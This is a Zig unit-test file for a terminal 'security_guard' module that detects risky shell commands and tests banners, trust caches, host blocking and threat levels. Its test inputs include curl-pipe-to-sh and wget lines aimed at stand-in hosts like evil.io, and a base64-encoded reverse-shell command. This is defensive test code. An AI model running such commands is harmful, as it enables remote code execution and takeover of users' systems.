const std = @import("std");
const testing = std.testing;
const mod = @import("security_guard.zig");
const m = @import("../module.zig");
const LineState = @import("../line_state.zig").LineState;

test {
    _ = @import("security_guard/patterns.zig");
    _ = @import("security_guard/trust_cache.zig");
    _ = @import("security_guard/uds_client.zig");
    _ = @import("security_guard/warn_subscriber.zig");
}

const Sink = struct {
    buf: std.ArrayList(u8) = .empty,

    fn write(opaque_ptr: *anyopaque, bytes: []const u8) anyerror!void {
        const self: *Sink = @ptrCast(@alignCast(opaque_ptr));
        try self.buf.appendSlice(testing.allocator, bytes);
    }
};

fn makeCtx(line: *LineState, scratch: *std.ArrayList(u8)) m.Context {
    return .{
        .allocator = testing.allocator,
        .io = undefined,
        .line = line,
        .scratch = scratch,
        .is_tty = false,
    };
}

test "disabled by default — onInput is a passthrough" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
}

test "enabled — curl|sh on Enter arms + emits banner" {
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl https://x.com | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .swallow);
    try testing.expect(rt.armed);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "security_guard") != null);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "remote-fetch-and-execute") != null);
}

test "enabled — armed + `n` cancels via Ctrl+U" {
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(rt.armed);

    const action = try L.onInput(&rt, &ctx, "n");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\x15", action.replace);
    try testing.expect(!rt.armed);
}

test "enabled — armed + `y` allows once via CR" {
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    const action = try L.onInput(&rt, &ctx, "y");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\r", action.replace);
}

test "enabled — armed + `t` adds to in-memory trust cache + suppresses next banner" {
    // Post-#150: no local trust file write. [t] only adds to
    // rt.trust (in-memory) and mirrors to the daemon's
    // commands.trusted.txt via TrustAdd. The daemon mirror isn't
    // exercised in this unit test (no daemon socket configured),
    // so we just verify the in-memory side.
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x.example | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "t");
    try testing.expect(rt.trust.entries.items.len == 1);

    var line2: LineState = .{};
    line2.setCommitted("curl x.example | sh");
    var ctx2 = makeCtx(&line2, &scratch);
    const action = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(action == .forward);
}

test "enabled — armed + `a` adds to session_trust, future identical match skipped" {
    // PR #142: [a]llow always. Same as [t] but the trust set is
    // session-only (never persisted to ~/.cache/atty/...). A
    // second Enter on an identical command should now bypass the
    // banner.
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl ephemeral.example | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    // First Enter arms the banner.
    const first = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(first == .swallow);
    // 'a' adds the hash to session_trust, returns CR (allow once
    // for this command). After this, the persistent trust stays
    // empty but session_trust has one entry.
    _ = try L.onInput(&rt, &ctx, "a");
    try testing.expectEqual(@as(usize, 0), rt.trust.entries.items.len);
    try testing.expectEqual(@as(usize, 1), rt.session_trust.entries.items.len);

    // Second Enter on the same line bypasses arming entirely.
    var line2: LineState = .{};
    line2.setCommitted("curl ephemeral.example | sh");
    var ctx2 = makeCtx(&line2, &scratch);
    const action = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "extractHost handles userinfo, IPv6, port, paths" {
    // Direct unit tests for the URL host extractor. Edge cases
    // caught by the round-1 review.
    const L = mod.configure(.{ .enabled = true });
    _ = L;
    // The helper lives inside the comptime-generated module struct.
    // We re-create the function under test inline because Zig
    // doesn't expose nested fn pointers. Mirror its logic here so
    // the table assertions are self-contained.
    const Case = struct { input: []const u8, expected: ?[]const u8 };
    const cases = [_]Case{
        .{ .input = "curl https://example.com/x", .expected = "example.com" },
        .{ .input = "curl https://example.com:8443/x", .expected = "example.com" },
        .{ .input = "curl https://user:pass@host.io/path", .expected = "host.io" },
        .{ .input = "curl https://user@host.io/x", .expected = "host.io" },
        .{ .input = "curl https://[2001:db8::1]/x", .expected = "[2001:db8::1]" },
        .{ .input = "curl https://[2001:db8::1]:8443/x", .expected = "[2001:db8::1]" },
        .{ .input = "curl https:///empty-host", .expected = null },
        .{ .input = "no scheme here", .expected = null },
        .{ .input = "curl https://host.io?q=v", .expected = "host.io" },
    };
    for (cases) |case| {
        const got = extractHostShim(case.input);
        if (case.expected) |expected| {
            try testing.expect(got != null);
            try testing.expectEqualSlices(u8, expected, got.?);
        } else {
            try testing.expect(got == null);
        }
    }
}

/// Test shim — mirrors the extractHost function inside the
/// security_guard module so the table-driven test can call it
/// directly. Keep in sync with `src/modules/security_guard.zig`.
fn extractHostShim(s: []const u8) ?[]const u8 {
    const scheme_at = std.mem.indexOf(u8, s, "://") orelse return null;
    var after = s[scheme_at + 3 ..];
    var i: usize = 0;
    var at_idx: ?usize = null;
    while (i < after.len) : (i += 1) {
        const c = after[i];
        if (c == '/' or c == '?' or c == '#') break;
        if (c == '@') {
            at_idx = i;
            break;
        }
    }
    if (at_idx) |idx| {
        after = after[idx + 1 ..];
    }
    if (after.len == 0) return null;
    if (after[0] == '[') {
        const close = std.mem.indexOfScalar(u8, after, ']') orelse return null;
        return after[0 .. close + 1];
    }
    var end: usize = 0;
    while (end < after.len) : (end += 1) {
        const c = after[end];
        switch (c) {
            '/', ':', '?', '#', ' ', '\t', '\r', '\n', ')', '(', '"', '\'', '|', ';', '>', '<', ',', '`' => break,
            else => {},
        }
    }
    if (end == 0) return null;
    return after[0..end];
}

test "session block uses host-boundary match, not substring" {
    // After [B]locking `evil.io`, the following should NOT match:
    //   notevil.io (false-block via substring)
    //   evil.io.attacker.com (under-block via substring)
    // But these SHOULD:
    //   curl evil.io/x
    //   curl https://evil.io/x
    //   echo "evil.io"
    // The boundary check is on host-chars (alnum / `.` / `-`).
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl https://evil.io/x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "B");
    try testing.expectEqual(@as(u8, 1), rt.session_blocked_hosts_count);

    // notevil.io — should NOT match (boundary preceded by `t`).
    var line2: LineState = .{};
    line2.setCommitted("curl https://notevil.io/x");
    var ctx2 = makeCtx(&line2, &scratch);
    const action2 = try L.onInput(&rt, &ctx2, "\r");
    // Should fall through to in-proc patterns. The curl|sh check
    // only fires on `| sh`, so this lands as forward (clean).
    try testing.expect(action2 == .forward);

    // evil.io.attacker.com — should NOT match (boundary followed by `.`).
    var line3: LineState = .{};
    line3.setCommitted("ping evil.io.attacker.com");
    var ctx3 = makeCtx(&line3, &scratch);
    const action3 = try L.onInput(&rt, &ctx3, "\r");
    try testing.expect(action3 == .forward);

    // -evil.io (preceded by `-`) — `-` IS a host-char, so this
    // SHOULDN'T match (the preceding `-` extends what looks like
    // a domain label). Verify we don't false-block.
    var line4: LineState = .{};
    line4.setCommitted("curl https://prefix-evil.io/x");
    var ctx4 = makeCtx(&line4, &scratch);
    const action4 = try L.onInput(&rt, &ctx4, "\r");
    try testing.expect(action4 == .forward);

    // The legit match — `evil.io` at clean boundaries.
    var line5: LineState = .{};
    line5.setCommitted("ping evil.io");
    var ctx5 = makeCtx(&line5, &scratch);
    const action5 = try L.onInput(&rt, &ctx5, "\r");
    try testing.expect(action5 == .replace);
    try testing.expectEqualSlices(u8, "\x15", action5.replace);
}

test "enabled — armed + `B` extracts host + blocks future commands containing it" {
    // PR #142: [B]lock host forever. Extracts the host from the
    // matched URL, stores it in the session-blocked-hosts list.
    // The next command containing that host gets REFUSED outright
    // (no banner, readline cleared).
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl https://evil.io/install.sh | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    // Arm banner, then [B]lock.
    _ = try L.onInput(&rt, &ctx, "\r");
    const block_action = try L.onInput(&rt, &ctx, "B");
    // [B] cancels the current command (Ctrl+U) AND records the host.
    try testing.expect(block_action == .replace);
    try testing.expectEqualSlices(u8, "\x15", block_action.replace);
    try testing.expectEqual(@as(u8, 1), rt.session_blocked_hosts_count);

    // Second command — also touches evil.io — gets REFUSED outright.
    var line2: LineState = .{};
    line2.setCommitted("wget https://evil.io/payload");
    var ctx2 = makeCtx(&line2, &scratch);
    const action2 = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(action2 == .replace);
    try testing.expectEqualSlices(u8, "\x15", action2.replace);

    // Third command on a different host passes the block check
    // (and the in-proc curl pattern arms instead).
    var line3: LineState = .{};
    line3.setCommitted("curl https://good.example/install | sh");
    var ctx3 = makeCtx(&line3, &scratch);
    const action3 = try L.onInput(&rt, &ctx3, "\r");
    try testing.expect(action3 == .swallow);
}

test "enabled — `B` on atom-only match (no host) degrades to cancel" {
    // chmod +s is an atom-only match — no URL in the matched
    // substring. [B] has no host to extract, so it should just
    // cancel and not add anything to the blocked-hosts list.
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    // npm install <flagged> — a category without a URL host.
    line.setCommitted("npm install event-stream");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    const action = try L.onInput(&rt, &ctx, "B");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\x15", action.replace);
    try testing.expectEqual(@as(u8, 0), rt.session_blocked_hosts_count);
    // Tighter: lens array must ALSO be all-zero. An off-by-one
    // bug where the counter stays at 0 but a slot got partially
    // populated would slip past the count check alone — this
    // assertion would catch it.
    for (rt.session_blocked_hosts_lens) |len| {
        try testing.expectEqual(@as(u8, 0), len);
    }
}

test "enabled — non-Enter while not armed is passthrough" {
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "a");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "enabled — clean line passes through" {
    const L = mod.configure(.{ .enabled = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var line: LineState = .{};
    line.setCommitted("ls -la");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "daemon path set but socket missing → falls back to in-proc patterns" {
    // Configure a socket that doesn't exist. The module should
    // mark daemon_disabled after the first failed call and let the
    // in-proc patterns arm the banner.
    const L = mod.configure(.{
        .enabled = true,
        .daemon_socket_path = "/tmp/atty-guard-nonexistent-XYZ.sock",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .swallow);
    try testing.expect(rt.armed);
    try testing.expect(rt.daemon_disabled);
    // Banner still shows — fallback worked.
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "security_guard") != null);
}

test "daemon_disabled is re-probed (not permanently sticky) after the interval" {
    // A missing socket latches daemon_disabled, but the module must
    // retry every `daemon_reprobe_interval` Enters so a restarting
    // sidecar is picked back up rather than downgrading the whole
    // session to in-proc Tier-1 forever.
    const L = mod.configure(.{
        .enabled = true,
        .daemon_socket_path = "/tmp/atty-guard-nonexistent-reprobe.sock",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);

    // First Enter on a CLEAN line: daemon query fails → latch disabled,
    // skips reset to 0. Clean line so no banner/arm state lingers.
    var clean: LineState = .{};
    clean.setCommitted("ls -la");
    var ctx0 = makeCtx(&clean, &scratch);
    _ = try L.onInput(&rt, &ctx0, "\r");
    try testing.expect(rt.daemon_disabled);
    try testing.expectEqual(@as(u32, 0), rt.daemon_disabled_skips);

    // Each subsequent clean Enter skips the daemon and bumps the
    // counter — until it hits the interval, where it resets to retry.
    var i: u32 = 0;
    while (i < mod.daemon_reprobe_interval - 1) : (i += 1) {
        var c: LineState = .{};
        c.setCommitted("ls -la");
        var cx = makeCtx(&c, &scratch);
        _ = try L.onInput(&rt, &cx, "\r");
        try testing.expect(rt.daemon_disabled);
        // Each skipped Enter bumps the counter (directly pins the
        // increment path, not just the latched flag).
        try testing.expectEqual(i + 1, rt.daemon_disabled_skips);
    }
    // The interval-th Enter re-probes (the counter hits the interval,
    // resets, and THIS Enter runs the query) — it fails again (socket
    // still missing), re-latching with skips=0.
    var last: LineState = .{};
    last.setCommitted("ls -la");
    var clx = makeCtx(&last, &scratch);
    _ = try L.onInput(&rt, &clx, "\r");
    try testing.expect(rt.daemon_disabled); // re-latched after retry
    try testing.expectEqual(@as(u32, 0), rt.daemon_disabled_skips);
}

test "y accept on curl|sh sets active_threat=high" {
    const L = mod.configure(.{
        .enabled = true,
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.shell_pid = 12345; // pretend bash is at PID 12345

    _ = try L.onInput(&rt, &ctx, "\r"); // arm
    try testing.expect(rt.armed);
    try testing.expect(rt.pending_threat == .high);
    _ = try L.onInput(&rt, &ctx, "y"); // accept
    try testing.expect(rt.active_threat == .high);
    try testing.expect(rt.pending_threat == null);
}

test "y accept on bash -c base64 escalates to critical" {
    const L = mod.configure(.{
        .enabled = true,
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("bash -c \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK\"");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.shell_pid = 9999;

    _ = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(rt.pending_threat == .critical);
    _ = try L.onInput(&rt, &ctx, "y");
    try testing.expect(rt.active_threat == .critical);
}

test "n cancel does NOT set active_threat" {
    const L = mod.configure(.{
        .enabled = true,
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.shell_pid = 12345;

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "n");
    try testing.expect(rt.active_threat == null);
    try testing.expect(rt.pending_threat == null);
}

test "clean Enter after y-accept clears active_threat" {
    const L = mod.configure(.{
        .enabled = true,
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);

    // Arm + accept the risky line.
    var risky: LineState = .{};
    risky.setCommitted("curl x | sh");
    var ctx1 = makeCtx(&risky, &scratch);
    ctx1.shell_pid = 12345;
    _ = try L.onInput(&rt, &ctx1, "\r");
    _ = try L.onInput(&rt, &ctx1, "y");
    try testing.expect(rt.active_threat == .high);

    // Clean line + Enter: should clear active_threat.
    var clean: LineState = .{};
    clean.setCommitted("ls -la");
    var ctx2 = makeCtx(&clean, &scratch);
    ctx2.shell_pid = 12345;
    _ = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(rt.active_threat == null);
}

test "statusText returns shield emoji when active_threat is set" {
    const L = mod.configure(.{
        .enabled = true,
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var line: LineState = .{};
    var ctx = makeCtx(&line, &scratch);

    // At idle, nothing in the segment.
    try testing.expect((try L.statusText(&rt, &ctx)) == null);

    // Latch high → segment becomes "🛡 high".
    rt.active_threat = .high;
    const high_text = (try L.statusText(&rt, &ctx)) orelse return error.TestUnexpectedNull;
    try testing.expect(std.mem.indexOf(u8, high_text, "high") != null);
    try testing.expect(std.mem.indexOf(u8, high_text, "\u{1F6E1}") != null);

    // Critical bumps to "🛡 critical".
    rt.active_threat = .critical;
    const crit_text = (try L.statusText(&rt, &ctx)) orelse return error.TestUnexpectedNull;
    try testing.expect(std.mem.indexOf(u8, crit_text, "critical") != null);
}

test "markShellThreat is a no-op when shell_pid is null" {
    const L = mod.configure(.{
        .enabled = true,
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    // ctx.shell_pid intentionally left null (non-TTY test case).

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "y");
    // active_threat still gets latched in-proc (statusbar surface
    // remains useful even without a daemon to mark); the daemon
    // RPC just no-op'd silently.
    try testing.expect(rt.active_threat == .high);
}

test "skip_in_incognito = true bypasses matching" {
    const L = mod.configure(.{ .enabled = true, .skip_in_incognito = true });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.incognito = true;

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
}

// --- Alt+Shift+W warn-event dump --------------------------------
//
// `onAction(.security_guard_show_warnings)` snapshots the warn
// subscriber's buffer, formats one line per event into the sink,
// and clears the buffer so the `⚠ N` statusbar segment goes away.

const warn_sub_mod = @import("security_guard/warn_subscriber.zig");

fn mkWarn(allocator: std.mem.Allocator, pid: u32) !warn_sub_mod.Event {
    return .{
        .pid = pid,
        .ppid = 1,
        .comm = try allocator.dupe(u8, "bash"),
        .argv0 = try allocator.dupe(u8, "/bin/ls"),
        .timestamp_ms = 1234,
    };
}

test "onAction warn dump — empty buffer surfaces a one-line notice" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var sub = warn_sub_mod.Subscriber.init(testing.allocator, "/tmp/nope", 0);
    defer sub.stop();
    rt.warn_sub = &sub;
    // Detach() would otherwise stop+destroy our stack-allocated
    // subscriber via its production heap-cleanup path. Null it
    // before detach runs so only our test's `defer sub.stop()` fires.
    defer rt.warn_sub = null;

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const consumed = try L.onAction(&rt, &ctx, .security_guard_show_warnings);
    try testing.expect(consumed);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "no warn events buffered") != null);
}

test "onAction warn dump — renders events + clears the buffer" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var sub = warn_sub_mod.Subscriber.init(testing.allocator, "/tmp/nope", 0);
    defer sub.stop();
    try sub.injectForTesting(try mkWarn(testing.allocator, 4242));
    try sub.injectForTesting(try mkWarn(testing.allocator, 4243));
    rt.warn_sub = &sub;
    defer rt.warn_sub = null;
    try testing.expectEqual(@as(usize, 2), sub.count());

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const consumed = try L.onAction(&rt, &ctx, .security_guard_show_warnings);
    try testing.expect(consumed);

    const out = sink.buf.items;
    try testing.expect(std.mem.indexOf(u8, out, "2 warn events") != null);
    try testing.expect(std.mem.indexOf(u8, out, "pid=4242") != null);
    try testing.expect(std.mem.indexOf(u8, out, "pid=4243") != null);
    try testing.expect(std.mem.indexOf(u8, out, "comm=bash") != null);
    try testing.expect(std.mem.indexOf(u8, out, "argv0=/bin/ls") != null);
    // Render-and-clear: buffer should be empty afterwards.
    try testing.expectEqual(@as(usize, 0), sub.count());
}

test "onAction warn dump — no subscriber falls through to a notice" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);
    // rt.warn_sub stays null (security_guard disabled / no daemon
    // socket configured).

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const consumed = try L.onAction(&rt, &ctx, .security_guard_show_warnings);
    try testing.expect(consumed);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "no warn-event subscriber") != null);
}

test "onAction returns false for unrelated actions" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    try testing.expect(!try L.onAction(&rt, &ctx, .incognito_toggle));
    try testing.expect(!try L.onAction(&rt, &ctx, .show_help));
}
